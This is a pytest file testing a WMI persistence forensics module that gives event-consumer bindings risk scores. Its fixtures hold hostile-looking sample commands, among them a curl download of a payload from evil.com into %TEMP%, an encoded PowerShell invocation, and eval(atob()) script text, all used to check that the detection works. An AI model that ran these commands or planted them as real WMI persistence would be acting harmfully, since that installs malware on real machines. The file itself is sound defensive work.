"""Tests for the heuristics / risk scoring module."""

from __future__ import annotations

import pytest

from wmi_forensics.heuristics import score_bundle, _level as _score_to_level
from wmi_forensics.models import (
    ActiveScriptEventConsumer,
    CommandLineEventConsumer,
    EventFilter,
    FilterToConsumerBinding,
    NTEventLogEventConsumer,
    WMIPersistenceBundle,
)


def _make_bundle(
    consumer=None,
    event_filter=None,
    consumer_name: str = "TestConsumer",
    consumer_type: str = "CommandLineEventConsumer",
    filter_name: str = "TestFilter",
    namespace: str = r"root\subscription",
) -> WMIPersistenceBundle:
    binding = FilterToConsumerBinding(
        consumer_name=consumer_name,
        consumer_type=consumer_type,
        filter_name=filter_name,
        namespace=namespace,
    )
    return WMIPersistenceBundle(
        binding=binding,
        event_filter=event_filter,
        consumer=consumer,
    )


class TestScoreToLevel:
    def test_low(self):
        assert _score_to_level(0.0) == "low"
        assert _score_to_level(0.29) == "low"

    def test_medium(self):
        assert _score_to_level(0.3) == "medium"
        assert _score_to_level(0.59) == "medium"

    def test_high(self):
        assert _score_to_level(0.6) == "high"
        assert _score_to_level(0.79) == "high"

    def test_critical(self):
        assert _score_to_level(0.8) == "critical"
        assert _score_to_level(1.0) == "critical"


class TestKnownLegitimate:
    def test_bvt_binding_is_legitimate(self):
        bundle = _make_bundle(
            consumer_name="BVTConsumer",
            filter_name="BVTFilter",
        )
        score_bundle(bundle)
        assert bundle.is_known_legitimate is True
        assert bundle.risk_score == 0.0
        assert bundle.risk_level == "low"
        assert bundle.legitimacy_note != ""

    def test_scm_binding_is_legitimate(self):
        bundle = _make_bundle(
            consumer_name="SCM Event Log Consumer",
            filter_name="SCM Event Log Filter",
        )
        score_bundle(bundle)
        assert bundle.is_known_legitimate is True

    def test_case_insensitive_whitelist(self):
        bundle = _make_bundle(
            consumer_name="bvtconsumer",
            filter_name="bvtfilter",
        )
        score_bundle(bundle)
        assert bundle.is_known_legitimate is True


class TestCommandLineConsumerScoring:
    def test_plain_cmdline_consumer_is_medium_or_higher(self):
        consumer = CommandLineEventConsumer(
            name="TestConsumer",
            consumer_type="CommandLineEventConsumer",
            command_line_template="notepad.exe",
        )
        bundle = _make_bundle(consumer=consumer)
        score_bundle(bundle)
        # Even a plain command gets 0.3 for being CommandLineEventConsumer
        assert bundle.risk_score >= 0.3

    def test_powershell_enc_raises_score(self):
        consumer = CommandLineEventConsumer(
            name="TestConsumer",
            consumer_type="CommandLineEventConsumer",
            command_line_template="powershell.exe -enc AABBCCDDEEFF==",
        )
        bundle = _make_bundle(consumer=consumer)
        score_bundle(bundle)
        # powershell (lolbin) + base64 flag should push score high
        assert bundle.risk_score >= 0.6

    def test_download_in_command_raises_score(self):
        consumer = CommandLineEventConsumer(
            name="TestConsumer",
            consumer_type="CommandLineEventConsumer",
            command_line_template="cmd.exe /c curl http://evil.com/payload.exe -o %TEMP%\\x.exe",
        )
        bundle = _make_bundle(consumer=consumer)
        score_bundle(bundle)
        assert bundle.risk_score >= 0.6

    def test_detection_reasons_are_documented(self):
        consumer = CommandLineEventConsumer(
            name="TestConsumer",
            consumer_type="CommandLineEventConsumer",
            command_line_template="powershell.exe -enc AABB==",
        )
        bundle = _make_bundle(consumer=consumer)
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "command_line_consumer" in factors
        assert len(bundle.detection_reasons) > 1  # at least 2 factors


class TestActiveScriptConsumerScoring:
    def test_activescript_is_high_risk(self):
        consumer = ActiveScriptEventConsumer(
            name="ScriptConsumer",
            consumer_type="ActiveScriptEventConsumer",
            scripting_engine="VBScript",
            script_text="WScript.Shell.Run 'cmd /c evil'",
        )
        bundle = _make_bundle(
            consumer=consumer,
            consumer_type="ActiveScriptEventConsumer",
        )
        score_bundle(bundle)
        assert bundle.risk_score >= 0.5
        assert bundle.risk_level in ("high", "critical")

    def test_base64_in_script_raises_score(self):
        # 50+ char base64 block in script text
        b64 = "A" * 50 + "=="
        consumer = ActiveScriptEventConsumer(
            name="ScriptConsumer",
            consumer_type="ActiveScriptEventConsumer",
            scripting_engine="JScript",
            script_text=f"eval(atob('{b64}'))",
        )
        bundle = _make_bundle(
            consumer=consumer,
            consumer_type="ActiveScriptEventConsumer",
        )
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "base64_in_script" in factors


class TestFilterScoring:
    def test_broad_query_adds_to_score(self):
        consumer = NTEventLogEventConsumer(
            name="LogConsumer",
            consumer_type="NTEventLogEventConsumer",
        )
        event_filter = EventFilter(
            name="BroadFilter",
            query="SELECT * FROM __InstanceCreationEvent",
        )
        bundle = _make_bundle(consumer=consumer, event_filter=event_filter)
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "broad_query" in factors

    def test_missing_filter_adds_to_score(self):
        consumer = NTEventLogEventConsumer(
            name="LogConsumer",
            consumer_type="NTEventLogEventConsumer",
        )
        bundle = _make_bundle(consumer=consumer, event_filter=None)
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "missing_filter" in factors


class TestNonStandardNamespace:
    def test_non_standard_ns_raises_score(self):
        consumer = NTEventLogEventConsumer(
            name="c",
            consumer_type="NTEventLogEventConsumer",
        )
        bundle = _make_bundle(
            consumer=consumer,
            namespace=r"root\evil\namespace",
        )
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "non_standard_namespace" in factors

    def test_standard_ns_no_ns_flag(self):
        consumer = NTEventLogEventConsumer(
            name="c",
            consumer_type="NTEventLogEventConsumer",
        )
        bundle = _make_bundle(
            consumer=consumer,
            namespace=r"root\subscription",
        )
        score_bundle(bundle)
        factors = {r.factor for r in bundle.detection_reasons}
        assert "non_standard_namespace" not in factors


class TestScoreCapping:
    def test_score_never_exceeds_1(self):
        # Accumulate every possible penalty
        consumer = ActiveScriptEventConsumer(
            name="evil",
            consumer_type="ActiveScriptEventConsumer",
            scripting_engine="JScript",
            script_text="http://evil.com " + "A" * 60 + "==",
        )
        flt = EventFilter(name="f", query="SELECT * FROM __InstanceCreationEvent")
        bundle = _make_bundle(
            consumer=consumer,
            event_filter=flt,
            namespace=r"root\evil",
            consumer_type="ActiveScriptEventConsumer",
        )
        bundle.is_orphaned = True
        score_bundle(bundle)
        assert bundle.risk_score <= 1.0
